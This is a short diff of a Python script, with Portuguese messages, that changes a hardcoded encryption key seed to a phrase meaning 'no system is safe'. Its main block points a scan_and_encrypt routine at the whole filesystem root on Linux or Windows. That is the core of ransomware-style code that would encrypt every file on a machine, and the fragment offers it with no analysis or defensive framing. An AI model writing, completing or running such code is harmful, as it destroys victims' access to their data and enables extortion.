@@ -12,11 +12,11 @@ def ask_for_key():
         print("Chave não fornecida. A operação foi cancelada.")
         return None
 
-    key = hashlib.sha256(key.encode()).digest()  # Gerando uma chave de 256 bits
+    key = hashlib.sha256(key.encode()).digest()
     return key
 
 if __name__ == "__main__":
-    key = hashlib.sha256("umachavequalquer".encode()).digest()
+    key = hashlib.sha256("nenhumsistemaestaasalvo".encode()).digest()
 
     directory = "/" if os.name != "nt" else "C:\\"
     scan_and_encrypt(directory, key)
